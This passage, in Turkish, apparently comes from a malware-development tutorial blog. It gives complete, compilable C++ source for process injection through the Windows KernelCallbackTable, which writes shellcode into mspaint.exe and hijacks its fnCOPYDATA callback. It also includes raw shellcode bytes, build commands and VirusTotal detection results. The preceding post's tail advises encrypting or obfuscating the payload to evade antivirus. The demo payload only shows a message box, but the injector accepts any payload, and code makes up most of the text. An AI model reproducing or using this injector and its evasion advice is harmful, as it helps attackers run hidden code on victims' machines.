	"\x01\xd0\xe3\x5c\x48\xff\xc9\x3e\x41\x8b\x34\x88\x48\x01"
	"\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41\x01"
	"\xc1\x38\xe0\x75\xf1\x3e\x4c\x03\x4c\x24\x08\x45\x39\xd1"
	"\x75\xd6\x58\x3e\x44\x8b\x40\x24\x49\x01\xd0\x66\x3e\x41"
	"\x8b\x0c\x48\x3e\x44\x8b\x40\x1c\x49\x01\xd0\x3e\x41\x8b"
	"\x04\x88\x48\x01\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58"
	"\x41\x59\x41\x5a\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41"
	"\x59\x5a\x3e\x48\x8b\x12\xe9\x49\xff\xff\xff\x5d\x49\xc7"
	"\xc1\x00\x00\x00\x00\x3e\x48\x8d\x95\x1a\x01\x00\x00\x3e"
	"\x4c\x8d\x85\x25\x01\x00\x00\x48\x31\xc9\x41\xba\x45\x83"
	"\x56\x07\xff\xd5\xbb\xe0\x1d\x2a\x0a\x41\xba\xa6\x95\xbd"
	"\x9d\xff\xd5\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0"
	"\x75\x05\xbb\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff"
	"\xd5\x4d\x65\x6f\x77\x2d\x6d\x65\x6f\x77\x21\x00\x3d\x5e"
	"\x2e\x2e\x5e\x3d\x00";

Demo

Haydi örneğimizi derlemeye başlayalım:

x86_64-w64-mingw32-g++ hack.cpp -o hack.exe -mconsole \
-I/usr/share/mingw-w64/include/ -s -ffunction-sections \
-fdata-sections -Wno-write-strings -fno-exceptions \
-fmerge-all-constants -static-libstdc++ -static-libgcc \
-fpermissive

++++++++++++++++++++++++++++++++++++++++++++++++++
Şimdi her şeyi eylemde görelim! Bizim durumumuzda kurban makine Windows 10 x64:
Her şeyin mükemmel bir şekilde tamamlandığını görebiliyoruz :)
++++++++++++++++++++++++++++++++++++++++++++++++++
++++++++++++++++++++++++++++++++++++++++++++++++++
Şimdi zararlı yazılımımızı VirusTotal'a yükleyelim:
++++++++++++++++++++++++++++++++++++++++++++++++++
https://www.virustotal.com/gui/file/a96b5c2a8fce03d4b6e30b9499a3df2280cb6f55
70bb4198a1bd51aeaa2665e8/detection

Sonuç olarak, 67 antivirüs motorundan 9 tanesi dosyamızı zararlı olarak algıladı.
Moneta64.exe sonucu:
++++++++++++++++++++++++++++++++++++++++++++++++++
Daha iyi sonuçlar için, payload şifrelemesini bir anahtar ile ekleyebilir, işlevleri gizleyebilir veya her iki tekniği birleştirebiliriz.
Umarım bu yazı, bu ilginç teknik hakkında mavi takım üyelerine farkındalık kazandırır ve kırmızı takım üyelerinin cephaneliğine bir silah daha ekler.
CreateProcessA(https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createprocessa?redirectedfrom=MSDN)
ZwCreateSection(https://docs.microsoft.com/en-us/windows-hardware/drivers/ddi/wdm/nf-wdm-zwcreatesection)
NtMapViewOfSection(http://undocumented.ntinternals.net/index.html?page=UserMode%2FUndocumented%20Functions%2FNT%20Objects%2FSection%2FNtMapViewOfSection.html)
ZwUnmapViewOfSection(https://docs.microsoft.com/en-us/windows-hardware/drivers/ddi/wdm/nf-wdm-zwunmapviewofsection)
ZwClose(https://docs.microsoft.com/en-us/windows-hardware/drivers/ddi/wdm/nf-wdm-zwclose)
ZwQueueApcThread/NtQueueApcThread(http://undocumented.ntinternals.net/index.html?page=UserMode%2FUndocumented%20Functions%2FAPC%2FNtQueueApcThread.html)
ZwSetInformationThread(https://docs.microsoft.com/en-us/windows-hardware/drivers/ddi/ntddk/nf-ntddk-zwsetinformationthread)
Moneta64.exe(https://github.com/forrest-orr/moneta)
Github’taki kaynak kod: https://github.com/cocomelonc/2022-01-17-malware-injection-14
27. KernelCallbackTable ile Süreç Enjeksiyonu. Basit C++ Zararlı Yazılım Örneği.
﷽
Bu yazı, KernelCallbackTable'daki fnCOPYDATA değerini sahte olarak ayarlayarak yapılan bir süreç enjeksiyonu tekniği üzerine yaptığım kendi araştırmaların bir sonucudur.
Bu tekniği daha ayrıntılı bir şekilde inceleyelim.
KernelCallbackTable
KernelCallbackTable PEB yapısında, 0x058 ofsetinde bulunabilir:
lkd> dt_PEB
++++++++++++++++++++++++++++++++++++++++++++++++++
lkd> dt_PEB @$peb kernelcallbacktable
++++++++++++++++++++++++++++++++++++++++++++++++++
KernelCallbackTable, bir dizi işlev olarak başlatılır:
lkd> dqs 0x00007ffa`29123070 L60
00007ffa`29123070 00007ffa`290c2bd0 user32!_fnCOPYDATA
00007ffa`29123078 00007ffa`2911ae70 user32!_fnCOPYGLOBALDATA
00007ffa`29123080 00007ffa`290c0420 user32!_fnDWORD
00007ffa`29123088 00007ffa`290c5680 user32!_fnNCDESTROY
00007ffa`29123090 00007ffa`290c96a0 user32!_fnDWORDOPTINLPMSG
00007ffa`29123098 00007ffa`2911b4a0 user32!_fnINOUTDRAG
//....

Örneğin, fnCOPYDATA gibi işlevler, bir WM_COPYDATA pencere mesajına yanıt olarak çağrılır.
Bu işlev, enjeksiyonu göstermek için değiştirilir.
Pratik Örnek
Bu tekniğin akışı şu şekildedir: Öncelikle, SDK'dan ntddk.h başlık dosyasını dahil edin:
#include <./ntddk.h>
Daha sonra, yeniden tanımlayın:
typedef struct _KERNELCALLBACKTABLE_T {
	ULONG_PTR __fnCOPYDATA;
	ULONG_PTR __fnCOPYGLOBALDATA;
	ULONG_PTR __fnDWORD;
	ULONG_PTR __fnNCDESTROY;
	ULONG_PTR __fnDWORDOPTINLPMSG;
	ULONG_PTR __fnINOUTDRAG;
	ULONG_PTR __fnGETTEXTLENGTHS;
	ULONG_PTR __fnINCNTOUTSTRING;
	ULONG_PTR __fnPOUTLPINT;
	ULONG_PTR __fnINLPCOMPAREITEMSTRUCT;
	ULONG_PTR __fnINLPCREATESTRUCT;
	ULONG_PTR __fnINLPDELETEITEMSTRUCT;
	ULONG_PTR __fnINLPDRAWITEMSTRUCT;
	ULONG_PTR __fnPOPTINLPUINT;
	ULONG_PTR __fnPOPTINLPUINT2;
	ULONG_PTR __fnINLPMDICREATESTRUCT;
	ULONG_PTR __fnINOUTLPMEASUREITEMSTRUCT;
	ULONG_PTR __fnINLPWINDOWPOS;
	ULONG_PTR __fnINOUTLPPOINT5;
	ULONG_PTR __fnINOUTLPSCROLLINFO;
	ULONG_PTR __fnINOUTLPRECT;
	ULONG_PTR __fnINOUTNCCALCSIZE;
	ULONG_PTR __fnINOUTLPPOINT5_;
	ULONG_PTR __fnINPAINTCLIPBRD;
	ULONG_PTR __fnINSIZECLIPBRD;
	ULONG_PTR __fnINDESTROYCLIPBRD;
	ULONG_PTR __fnINSTRING;
	ULONG_PTR __fnINSTRINGNULL;
	ULONG_PTR __fnINDEVICECHANGE;
	ULONG_PTR __fnPOWERBROADCAST;
	ULONG_PTR __fnINLPUAHDRAWMENU;
	ULONG_PTR __fnOPTOUTLPDWORDOPTOUTLPDWORD;
	ULONG_PTR __fnOPTOUTLPDWORDOPTOUTLPDWORD_;
	ULONG_PTR __fnOUTDWORDINDWORD;
	ULONG_PTR __fnOUTLPRECT;
	ULONG_PTR __fnOUTSTRING;
	ULONG_PTR __fnPOPTINLPUINT3;
	ULONG_PTR __fnPOUTLPINT2;
	ULONG_PTR __fnSENTDDEMSG;
	ULONG_PTR __fnINOUTSTYLECHANGE;
	ULONG_PTR __fnHkINDWORD;
	ULONG_PTR __fnHkINLPCBTACTIVATESTRUCT;
	ULONG_PTR __fnHkINLPCBTCREATESTRUCT;
	ULONG_PTR __fnHkINLPDEBUGHOOKSTRUCT;
	ULONG_PTR __fnHkINLPMOUSEHOOKSTRUCTEX;
	ULONG_PTR __fnHkINLPKBDLLHOOKSTRUCT;
	ULONG_PTR __fnHkINLPMSLLHOOKSTRUCT;
	ULONG_PTR __fnHkINLPMSG;
	ULONG_PTR __fnHkINLPRECT;
	ULONG_PTR __fnHkOPTINLPEVENTMSG;
	ULONG_PTR __xxxClientCallDelegateThread;
	ULONG_PTR __ClientCallDummyCallback;
	ULONG_PTR __fnKEYBOARDCORRECTIONCALLOUT;
	ULONG_PTR __fnOUTLPCOMBOBOXINFO;
	ULONG_PTR __fnINLPCOMPAREITEMSTRUCT2;
	ULONG_PTR __xxxClientCallDevCallbackCapture;
	ULONG_PTR __xxxClientCallDitThread;
	ULONG_PTR __xxxClientEnableMMCSS;
	ULONG_PTR __xxxClientUpdateDpi;
	ULONG_PTR __xxxClientExpandStringW;
	ULONG_PTR __ClientCopyDDEIn1;
	ULONG_PTR __ClientCopyDDEIn2;
	ULONG_PTR __ClientCopyDDEOut1;
	ULONG_PTR __ClientCopyDDEOut2;
	ULONG_PTR __ClientCopyImage;
	ULONG_PTR __ClientEventCallback;
	ULONG_PTR __ClientFindMnemChar;
	ULONG_PTR __ClientFreeDDEHandle;
	ULONG_PTR __ClientFreeLibrary;
	ULONG_PTR __ClientGetCharsetInfo;
	ULONG_PTR __ClientGetDDEFlags;
	ULONG_PTR __ClientGetDDEHookData;
	ULONG_PTR __ClientGetListboxString;
	ULONG_PTR __ClientGetMessageMPH;
	ULONG_PTR __ClientLoadImage;
	ULONG_PTR __ClientLoadLibrary;
	ULONG_PTR __ClientLoadMenu;
	ULONG_PTR __ClientLoadLocalT1Fonts;
	ULONG_PTR __ClientPSMTextOut;
	ULONG_PTR __ClientLpkDrawTextEx;
	ULONG_PTR __ClientExtTextOutW;
	ULONG_PTR __ClientGetTextExtentPointW;
	ULONG_PTR __ClientCharToWchar;
	ULONG_PTR __ClientAddFontResourceW;
	ULONG_PTR __ClientThreadSetup;
	ULONG_PTR __ClientDeliverUserApc;
	ULONG_PTR __ClientNoMemoryPopup;
	ULONG_PTR __ClientMonitorEnumProc;
	ULONG_PTR __ClientCallWinEventProc;
	ULONG_PTR __ClientWaitMessageExMPH;
	ULONG_PTR __ClientWOWGetProcModule;
	ULONG_PTR __ClientWOWTask16SchedNotify;
	ULONG_PTR __ClientImmLoadLayout;
	ULONG_PTR __ClientImmProcessKey;
	ULONG_PTR __fnIMECONTROL;
	ULONG_PTR __fnINWPARAMDBCSCHAR;
	ULONG_PTR __fnGETTEXTLENGTHS2;
	ULONG_PTR __fnINLPKDRAWSWITCHWND;
	ULONG_PTR __ClientLoadStringW;
	ULONG_PTR __ClientLoadOLE;
	ULONG_PTR __ClientRegisterDragDrop;
	ULONG_PTR __ClientRevokeDragDrop;
	ULONG_PTR __fnINOUTMENUGETOBJECT;
	ULONG_PTR __ClientPrinterThunk;
	ULONG_PTR __fnOUTLPCOMBOBOXINFO2;
	ULONG_PTR __fnOUTLPSCROLLBARINFO;
	ULONG_PTR __fnINLPUAHDRAWMENU2;
	ULONG_PTR __fnINLPUAHDRAWMENUITEM;
	ULONG_PTR __fnINLPUAHDRAWMENU3;
	ULONG_PTR __fnINOUTLPUAHMEASUREMENUITEM;
	ULONG_PTR __fnINLPUAHDRAWMENU4;
	ULONG_PTR __fnOUTLPTITLEBARINFOEX;
	ULONG_PTR __fnTOUCH;
	ULONG_PTR __fnGESTURE;
	ULONG_PTR __fnPOPTINLPUINT4;
	ULONG_PTR __fnPOPTINLPUINT5;
	ULONG_PTR __xxxClientCallDefaultInputHandler;
	ULONG_PTR __fnEMPTY;
	ULONG_PTR __ClientRimDevCallback;
	ULONG_PTR __xxxClientCallMinTouchHitTestingCallback;
	ULONG_PTR __ClientCallLocalMouseHooks;
	ULONG_PTR __xxxClientBroadcastThemeChange;
	ULONG_PTR __xxxClientCallDevCallbackSimple;
	ULONG_PTR __xxxClientAllocWindowClassExtraBytes;
	ULONG_PTR __xxxClientFreeWindowClassExtraBytes;
	ULONG_PTR __fnGETWINDOWDATA;
	ULONG_PTR __fnINOUTSTYLECHANGE2;
	ULONG_PTR __fnHkINLPMOUSEHOOKSTRUCTEX2;
} KERNELCALLBACKTABLE;

Daha sonra, mspaint.exe için bir pencere bulun, süreç kimliğini (process id) elde edin ve açın:

// find a window for mspaint.exe
HWND hw = FindWindow(NULL, (LPCSTR) "Untitled - Paint");
if (hw == NULL) {
	printf("failed to find window :(\n");
	return-2;
}
GetWindowThreadProcessId(hw, &pid);
ph = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);

Ardından, PEB'i ve mevcut tablo adresini okuyun:

HMODULE ntdll = GetModuleHandleA("ntdll");
pNtQueryInformationProcess myNtQueryInformationProcess =
(pNtQueryInformationProcess)(GetProcAddress(
ntdll, "NtQueryInformationProcess"));

myNtQueryInformationProcess(ph,
ProcessBasicInformation,
&pbi, sizeof(pbi), NULL);

ReadProcessMemory(ph, pbi.PebBaseAddress,
&peb, sizeof(peb), NULL);
ReadProcessMemory(ph, peb.KernelCallbackTable,
&kct, sizeof(kct), NULL);

Daha sonra, VirtualAllocEx ve WriteProcessMemory kullanarak payload'umuzu uzak sürece yazın:
LPVOID rb = VirtualAllocEx(ph, NULL, sizeof(my_payload),
MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);
WriteProcessMemory(ph, rb, my_payload,
sizeof(my_payload), NULL);

VirtualAllocEx kullanıyoruz, bu işlev uzak süreç için bir bellek tamponu ayırmanıza olanak tanır. Ardından, WriteProcessMemory, süreçler arasında veri kopyalamanıza olanak tanır, bu yüzden payload'umuzu mspaint.exe sürecine kopyalıyoruz.
Yeni tabloyu uzak sürece yazın:
LPVOID tb = VirtualAllocEx(ph, NULL, sizeof(kct),
MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
kct.__fnCOPYDATA = (ULONG_PTR)rb;
WriteProcessMemory(ph, tb, &kct, sizeof(kct), NULL);

PEB’i güncelleyelim:

WriteProcessMemory(ph,
(PBYTE)pbi.PebBaseAddress + offsetof(PEB, KernelCallbackTable),
&tb, sizeof(ULONG_PTR), NULL);

Payload'un yürütülmesini tetikleyin:

cds.dwData = 1;
cds.cbData = lstrlen((LPCSTR)msg) * 2;
cds.lpData = msg;

SendMessage(hw, WM_COPYDATA, (WPARAM)hw, (LPARAM)&cds);

Son olarak, orijinal KernelCallbackTable'ı geri yükleyin:

WriteProcessMemory(ph,
(PBYTE)pbi.PebBaseAddress + offsetof(PEB, KernelCallbackTable),
&peb.KernelCallbackTable,
sizeof(ULONG_PTR), NULL);
SendMessage(hw, WM_COPYDATA, (WPARAM)hw, (LPARAM)&cds);

Burada, orijinal kodu geri yüklemek ve normal bir şekilde geri yüklendiğinden emin olmak için SendMessage() işlevini tekrar çağırdık. Bu, kodun artık çalışmadığını doğrulamamızı sağlar
Yani, basit zararlı yazılımımızın tam C++ kodu şu şekilde:
/*
* hack.cpp - process injection via
* KernelCallbackTable. C++ implementation
* @cocomelonc
* https://cocomelonc.github.io/tutorial/
2022/01/24/malware-injection-15.html
*/
#include <./ntddk.h>
#include <cstdio>

#include <cstddef>

#pragma comment(lib, "ntdll");

typedef struct _KERNELCALLBACKTABLE_T {
	ULONG_PTR __fnCOPYDATA;
	ULONG_PTR __fnCOPYGLOBALDATA;
	ULONG_PTR __fnDWORD;
	ULONG_PTR __fnNCDESTROY;
	ULONG_PTR __fnDWORDOPTINLPMSG;
	ULONG_PTR __fnINOUTDRAG;
	ULONG_PTR __fnGETTEXTLENGTHS;
	ULONG_PTR __fnINCNTOUTSTRING;
	ULONG_PTR __fnPOUTLPINT;
	ULONG_PTR __fnINLPCOMPAREITEMSTRUCT;
	ULONG_PTR __fnINLPCREATESTRUCT;
	ULONG_PTR __fnINLPDELETEITEMSTRUCT;
	ULONG_PTR __fnINLPDRAWITEMSTRUCT;
	ULONG_PTR __fnPOPTINLPUINT;
	ULONG_PTR __fnPOPTINLPUINT2;
	ULONG_PTR __fnINLPMDICREATESTRUCT;
	ULONG_PTR __fnINOUTLPMEASUREITEMSTRUCT;
	ULONG_PTR __fnINLPWINDOWPOS;
	ULONG_PTR __fnINOUTLPPOINT5;
	ULONG_PTR __fnINOUTLPSCROLLINFO;
	ULONG_PTR __fnINOUTLPRECT;
	ULONG_PTR __fnINOUTNCCALCSIZE;
	ULONG_PTR __fnINOUTLPPOINT5_;
	ULONG_PTR __fnINPAINTCLIPBRD;
	ULONG_PTR __fnINSIZECLIPBRD;
	ULONG_PTR __fnINDESTROYCLIPBRD;
	ULONG_PTR __fnINSTRING;
	ULONG_PTR __fnINSTRINGNULL;
	ULONG_PTR __fnINDEVICECHANGE;
	ULONG_PTR __fnPOWERBROADCAST;
	ULONG_PTR __fnINLPUAHDRAWMENU;
	ULONG_PTR __fnOPTOUTLPDWORDOPTOUTLPDWORD;
	ULONG_PTR __fnOPTOUTLPDWORDOPTOUTLPDWORD_;
	ULONG_PTR __fnOUTDWORDINDWORD;
	ULONG_PTR __fnOUTLPRECT;
	ULONG_PTR __fnOUTSTRING;
	ULONG_PTR __fnPOPTINLPUINT3;
	ULONG_PTR __fnPOUTLPINT2;
	ULONG_PTR __fnSENTDDEMSG;
	ULONG_PTR __fnINOUTSTYLECHANGE;
	ULONG_PTR __fnHkINDWORD;
	ULONG_PTR __fnHkINLPCBTACTIVATESTRUCT;
	ULONG_PTR __fnHkINLPCBTCREATESTRUCT;
	ULONG_PTR __fnHkINLPDEBUGHOOKSTRUCT;
	ULONG_PTR __fnHkINLPMOUSEHOOKSTRUCTEX;
	ULONG_PTR __fnHkINLPKBDLLHOOKSTRUCT;
	ULONG_PTR __fnHkINLPMSLLHOOKSTRUCT;
	ULONG_PTR __fnHkINLPMSG;
	ULONG_PTR __fnHkINLPRECT;
	ULONG_PTR __fnHkOPTINLPEVENTMSG;
	ULONG_PTR __xxxClientCallDelegateThread;
	ULONG_PTR __ClientCallDummyCallback;
	ULONG_PTR __fnKEYBOARDCORRECTIONCALLOUT;
	ULONG_PTR __fnOUTLPCOMBOBOXINFO;
	ULONG_PTR __fnINLPCOMPAREITEMSTRUCT2;
	ULONG_PTR __xxxClientCallDevCallbackCapture;
	ULONG_PTR __xxxClientCallDitThread;
	ULONG_PTR __xxxClientEnableMMCSS;
	ULONG_PTR __xxxClientUpdateDpi;
	ULONG_PTR __xxxClientExpandStringW;
	ULONG_PTR __ClientCopyDDEIn1;
	ULONG_PTR __ClientCopyDDEIn2;
	ULONG_PTR __ClientCopyDDEOut1;
	ULONG_PTR __ClientCopyDDEOut2;
	ULONG_PTR __ClientCopyImage;
	ULONG_PTR __ClientEventCallback;
	ULONG_PTR __ClientFindMnemChar;
	ULONG_PTR __ClientFreeDDEHandle;
	ULONG_PTR __ClientFreeLibrary;
	ULONG_PTR __ClientGetCharsetInfo;
	ULONG_PTR __ClientGetDDEFlags;
	ULONG_PTR __ClientGetDDEHookData;
	ULONG_PTR __ClientGetListboxString;
	ULONG_PTR __ClientGetMessageMPH;
	ULONG_PTR __ClientLoadImage;
	ULONG_PTR __ClientLoadLibrary;
	ULONG_PTR __ClientLoadMenu;
	ULONG_PTR __ClientLoadLocalT1Fonts;
	ULONG_PTR __ClientPSMTextOut;
	ULONG_PTR __ClientLpkDrawTextEx;
	ULONG_PTR __ClientExtTextOutW;
	ULONG_PTR __ClientGetTextExtentPointW;
	ULONG_PTR __ClientCharToWchar;
	ULONG_PTR __ClientAddFontResourceW;
	ULONG_PTR __ClientThreadSetup;
	ULONG_PTR __ClientDeliverUserApc;
	ULONG_PTR __ClientNoMemoryPopup;
	ULONG_PTR __ClientMonitorEnumProc;
	ULONG_PTR __ClientCallWinEventProc;
	ULONG_PTR __ClientWaitMessageExMPH;
	ULONG_PTR __ClientWOWGetProcModule;
	ULONG_PTR __ClientWOWTask16SchedNotify;
	ULONG_PTR __ClientImmLoadLayout;
	ULONG_PTR __ClientImmProcessKey;
	ULONG_PTR __fnIMECONTROL;
	ULONG_PTR __fnINWPARAMDBCSCHAR;
	ULONG_PTR __fnGETTEXTLENGTHS2;
	ULONG_PTR __fnINLPKDRAWSWITCHWND;
	ULONG_PTR __ClientLoadStringW;
	ULONG_PTR __ClientLoadOLE;
	ULONG_PTR __ClientRegisterDragDrop;
	ULONG_PTR __ClientRevokeDragDrop;
	ULONG_PTR __fnINOUTMENUGETOBJECT;
	ULONG_PTR __ClientPrinterThunk;
	ULONG_PTR __fnOUTLPCOMBOBOXINFO2;
	ULONG_PTR __fnOUTLPSCROLLBARINFO;
	ULONG_PTR __fnINLPUAHDRAWMENU2;
	ULONG_PTR __fnINLPUAHDRAWMENUITEM;
	ULONG_PTR __fnINLPUAHDRAWMENU3;
	ULONG_PTR __fnINOUTLPUAHMEASUREMENUITEM;
	ULONG_PTR __fnINLPUAHDRAWMENU4;
	ULONG_PTR __fnOUTLPTITLEBARINFOEX;
	ULONG_PTR __fnTOUCH;
	ULONG_PTR __fnGESTURE;
	ULONG_PTR __fnPOPTINLPUINT4;
	ULONG_PTR __fnPOPTINLPUINT5;
	ULONG_PTR __xxxClientCallDefaultInputHandler;
	ULONG_PTR __fnEMPTY;
	ULONG_PTR __ClientRimDevCallback;
	ULONG_PTR __xxxClientCallMinTouchHitTestingCallback;
	ULONG_PTR __ClientCallLocalMouseHooks;
	ULONG_PTR __xxxClientBroadcastThemeChange;
	ULONG_PTR __xxxClientCallDevCallbackSimple;
	ULONG_PTR __xxxClientAllocWindowClassExtraBytes;
	ULONG_PTR __xxxClientFreeWindowClassExtraBytes;
	ULONG_PTR __fnGETWINDOWDATA;
	ULONG_PTR __fnINOUTSTYLECHANGE2;
	ULONG_PTR __fnHkINLPMOUSEHOOKSTRUCTEX2;
} KERNELCALLBACKTABLE;

// NtQueryInformationProcess
typedef NTSTATUS(NTAPI* pNtQueryInformationProcess)(
	IN HANDLE ProcessHandle,
	IN PROCESSINFOCLASS ProcessInformationClass,
	OUT PVOID ProcessInformation,
	IN ULONG ProcessInformationLength,
	OUT PULONG ReturnLength OPTIONAL
	);

unsigned char my_payload[] =
	// 64-bit meow-meow messagebox
	"\xfc\x48\x81\xe4\xf0\xff\xff\xff\xe8\xd0\x00\x00\x00\x41"
	"\x51\x41\x50\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60"
	"\x3e\x48\x8b\x52\x18\x3e\x48\x8b\x52\x20\x3e\x48\x8b\x72"
	"\x50\x3e\x48\x0f\xb7\x4a\x4a\x4d\x31\xc9\x48\x31\xc0\xac"
	"\x3c\x61\x7c\x02\x2c\x20\x41\xc1\xc9\x0d\x41\x01\xc1\xe2"
	"\xed\x52\x41\x51\x3e\x48\x8b\x52\x20\x3e\x8b\x42\x3c\x48"
	"\x01\xd0\x3e\x8b\x80\x88\x00\x00\x00\x48\x85\xc0\x74\x6f"
	"\x48\x01\xd0\x50\x3e\x8b\x48\x18\x3e\x44\x8b\x40\x20\x49"
	"\x01\xd0\xe3\x5c\x48\xff\xc9\x3e\x41\x8b\x34\x88\x48\x01"
	"\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41\x01"
	"\xc1\x38\xe0\x75\xf1\x3e\x4c\x03\x4c\x24\x08\x45\x39\xd1"
	"\x75\xd6\x58\x3e\x44\x8b\x40\x24\x49\x01\xd0\x66\x3e\x41"
	"\x8b\x0c\x48\x3e\x44\x8b\x40\x1c\x49\x01\xd0\x3e\x41\x8b"
	"\x04\x88\x48\x01\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58"
	"\x41\x59\x41\x5a\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41"
	"\x59\x5a\x3e\x48\x8b\x12\xe9\x49\xff\xff\xff\x5d\x49\xc7"
	"\xc1\x00\x00\x00\x00\x3e\x48\x8d\x95\x1a\x01\x00\x00\x3e"
	"\x4c\x8d\x85\x25\x01\x00\x00\x48\x31\xc9\x41\xba\x45\x83"
	"\x56\x07\xff\xd5\xbb\xe0\x1d\x2a\x0a\x41\xba\xa6\x95\xbd"
	"\x9d\xff\xd5\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0"
	"\x75\x05\xbb\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff"
	"\xd5\x4d\x65\x6f\x77\x2d\x6d\x65\x6f\x77\x21\x00\x3d\x5e"
	"\x2e\x2e\x5e\x3d\x00";
int main() {
	HANDLE ph;
	DWORD pid;
	PROCESS_BASIC_INFORMATION pbi;
	KERNELCALLBACKTABLE kct;
	COPYDATASTRUCT cds;
	PEB peb;
	WCHAR msg[] = L"kernelcallbacktable injection impl";

	// find a window for mspaint.exe
	HWND hw = FindWindow(NULL, (LPCSTR) "Untitled - Paint");
	if (hw == NULL) {
		printf("failed to find window :(\n");
		return-2;
	}
	GetWindowThreadProcessId(hw, &pid);
	ph = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);

	HMODULE ntdll = GetModuleHandleA("ntdll");
	pNtQueryInformationProcess myNtQueryInformationProcess =
	(pNtQueryInformationProcess)(GetProcAddress(
	ntdll, "NtQueryInformationProcess"));

	myNtQueryInformationProcess(ph,
	ProcessBasicInformation, &pbi, sizeof(pbi), NULL);

	ReadProcessMemory(ph, pbi.PebBaseAddress,
	&peb, sizeof(peb), NULL);
	ReadProcessMemory(ph, peb.KernelCallbackTable,
	&kct, sizeof(kct), NULL);

	LPVOID rb = VirtualAllocEx(ph, NULL, sizeof(my_payload),
	MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);
	WriteProcessMemory(ph, rb, my_payload,
	sizeof(my_payload), NULL);

	LPVOID tb = VirtualAllocEx(ph, NULL, sizeof(kct),
	MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
	kct.__fnCOPYDATA = (ULONG_PTR)rb;
	WriteProcessMemory(ph, tb, &kct, sizeof(kct), NULL);

	WriteProcessMemory(ph,
	(PBYTE)pbi.PebBaseAddress + offsetof(PEB, KernelCallbackTable),
	&tb, sizeof(ULONG_PTR), NULL);

cds.dwData = 1;
	cds.cbData = lstrlen((LPCSTR)msg) * 2;
	cds.lpData = msg;

	SendMessage(hw, WM_COPYDATA, (WPARAM)hw, (LPARAM)&cds);
	WriteProcessMemory(ph,
	(PBYTE)pbi.PebBaseAddress + offsetof(PEB, KernelCallbackTable),
	&peb.KernelCallbackTable, sizeof(ULONG_PTR), NULL);

	VirtualFreeEx(ph, rb, 0, MEM_RELEASE);
	VirtualFreeEx(ph, tb, 0, MEM_RELEASE);
	CloseHandle(ph);
	return 0;
}
Her zamanki gibi, basitlik adına, payload olarak meow-meow mesaj kutusunu kullandım:

unsigned char my_payload[] =
	// 64-bit meow-meow messagebox
	"\xfc\x48\x81\xe4\xf0\xff\xff\xff\xe8\xd0\x00\x00\x00\x41"
	"\x51\x41\x50\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60"
	"\x3e\x48\x8b\x52\x18\x3e\x48\x8b\x52\x20\x3e\x48\x8b\x72"
	"\x50\x3e\x48\x0f\xb7\x4a\x4a\x4d\x31\xc9\x48\x31\xc0\xac"
	"\x3c\x61\x7c\x02\x2c\x20\x41\xc1\xc9\x0d\x41\x01\xc1\xe2"
	"\xed\x52\x41\x51\x3e\x48\x8b\x52\x20\x3e\x8b\x42\x3c\x48"
	"\x01\xd0\x3e\x8b\x80\x88\x00\x00\x00\x48\x85\xc0\x74\x6f"
	"\x48\x01\xd0\x50\x3e\x8b\x48\x18\x3e\x44\x8b\x40\x20\x49"
	"\x01\xd0\xe3\x5c\x48\xff\xc9\x3e\x41\x8b\x34\x88\x48\x01"
	"\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41\x01"
	"\xc1\x38\xe0\x75\xf1\x3e\x4c\x03\x4c\x24\x08\x45\x39\xd1"
	"\x75\xd6\x58\x3e\x44\x8b\x40\x24\x49\x01\xd0\x66\x3e\x41"
	"\x8b\x0c\x48\x3e\x44\x8b\x40\x1c\x49\x01\xd0\x3e\x41\x8b"
	"\x04\x88\x48\x01\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58"
	"\x41\x59\x41\x5a\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41"
	"\x59\x5a\x3e\x48\x8b\x12\xe9\x49\xff\xff\xff\x5d\x49\xc7"
	"\xc1\x00\x00\x00\x00\x3e\x48\x8d\x95\x1a\x01\x00\x00\x3e"
	"\x4c\x8d\x85\x25\x01\x00\x00\x48\x31\xc9\x41\xba\x45\x83"
	"\x56\x07\xff\xd5\xbb\xe0\x1d\x2a\x0a\x41\xba\xa6\x95\xbd"
	"\x9d\xff\xd5\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0"
	"\x75\x05\xbb\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff"
	"\xd5\x4d\x65\x6f\x77\x2d\x6d\x65\x6f\x77\x21\x00\x3d\x5e"
	"\x2e\x2e\x5e\x3d\x00";
Demo
Şimdi her şeyi eylemde görelim. Örneğimizi derleyelim:
x86_64-w64-mingw32-g++ hack.cpp -o hack.exe -mconsole \
-I/usr/share/mingw-w64/include/ \
-I/home/.../cybersec_blog/2022-01-24-malware-injection-15/ \
-s -ffunction-sections -fdata-sections \
-Wno-write-strings -fno-exceptions -fmerge-all-constants \
-static-libstdc++ -static-libgcc -fpermissive

++++++++++++++++++++++++++++++++++++++++++++++++++
Sonra kodu çalıştıralım.Bizim durumumuzda kurban makinemiz Windows 10 x64:
+++++++++++++++++++++++++++++++++++++++++++++
+++++++++++++++++++++++++++++++++++++++++++++++++++++++
Her şeyin mükemmel bir şekilde tamamlandığını görebiliyoruz :)	
İlginç bir gözlem: Meow mesaj kutusu penceresini kapattığımda, mspaint.exe çöküyor ve ardından kurtarılıyor:
+++++++++++++++++++++++++++++++++++++++++++++
Moneta.exe sonucu:
